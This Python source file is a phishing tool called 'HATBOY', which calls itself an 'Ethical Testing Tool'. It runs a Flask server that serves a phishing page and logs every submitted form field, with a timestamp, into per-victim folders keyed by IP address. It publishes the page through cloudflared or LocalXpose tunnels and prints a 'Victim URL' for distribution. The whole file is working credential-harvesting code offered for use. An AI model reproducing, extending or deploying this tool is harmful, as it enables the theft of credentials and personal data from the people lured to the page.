import os
import platform
import subprocess
import time
from flask import Flask, request, render_template
import json
from datetime import datetime
import socket

def display_banner():
    print("\033[1;92m")
    print("██╗  ██╗ █████╗ ████████╗██████╗  ██████╗ ██╗   ██╗")
    print("██║  ██║██╔══██╗╚══██╔══╝██╔══██╗██╔═══██╗██║   ██║")
    print("███████║███████║   ██║   ██████╔╝██║   ██║██║   ██║")
    print("██╔══██║██╔══██║   ██║   ██   ██╗██║   ██║██║   ██║")
    print("██║  ██║██║  ██║   ██║   ██████╔╝╚██████╔╝╚██████╔╝")
    print("╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═════╝  ╚═════╝  ╚═██║═╝ ")
    print("\033[1;94m")
    print("                H A T B OY")
    print("         Ethical Testing Tool v3.2")
    print("\033[1;93m")
    print("       Developed by Mister-God")
    print("\033[0m")

# Flask app
app = Flask(__name__, template_folder="templates")

# Global variables
victim_data_folder = "victim_data"

@app.route("/", methods=["GET", "POST"])
def phishing_page():
    victim_ip = request.remote_addr
    victim_folder = os.path.join(victim_data_folder, victim_ip)
    os.makedirs(victim_folder, exist_ok=True)

    if request.method == "POST":
        form_data = request.form.to_dict()
        form_data["timestamp"] = str(datetime.now())
        with open(os.path.join(victim_folder, "details.json"), "a") as file:
            json.dump(form_data, file, indent=4)
            file.write("\n")

        if "name" not in form_data:
            return render_template("name_prompt.html")
        else:
            return render_template("success.html")

    return render_template("phishing_template.html")


def generate_localhost_url(port):
    return f"http://127.0.0.1:{port}"


def start_cloudflared(port):
    cloudflared_path = ".server/cloudflared"
    if platform.system().lower() == "windows":
        cloudflared_path += ".exe"

    process = subprocess.Popen(
        [cloudflared_path, "tunnel", "--url", f"http://127.0.0.1:{port}"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )

    time.sleep(10)  # Wait for Cloudflared to establish the tunnel
    output = process.stdout.read()
    url = None
    for line in output.splitlines():
        if "trycloudflare.com" in line:
            url = line.split(" ")[-1].strip()
            break

    if url:
        return url
    else:
        process.terminate()
        raise Exception("Cloudflared failed to generate a URL")


def start_localxpose(port):
    lx_path = ".server/localxpose"
    process = subprocess.Popen(
        [lx_path, "http", f"--port={port}"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )

    time.sleep(10)  # Wait for LocalXpose to establish the tunnel
    output = process.stdout.read()
    url = None
    for line in output.splitlines():
        if "loclx.io" in line:
            url = line.split(" ")[-1].strip()
            break

    if url:
        return url
    else:
        process.terminate()
        raise Exception("LocalXpose failed to generate a URL")


if __name__ == "__main__":
    print("Select an option:")
    print("[01] Localhost")
    print("[02] Cloudflared")
    print("[03] LocalXpose")
    choice = input("Enter your choice: ").strip()

    port = 8080
    if choice == "01":
        url = generate_localhost_url(port)
    elif choice == "02":
        url = start_cloudflared(port)
    elif choice == "03":
        url = start_localxpose(port)
    else:
        print("[!] Invalid choice")
        exit(1)

    print(f"[+] Victim URL: {url}")
    app.run(host="0.0.0.0", port=port)
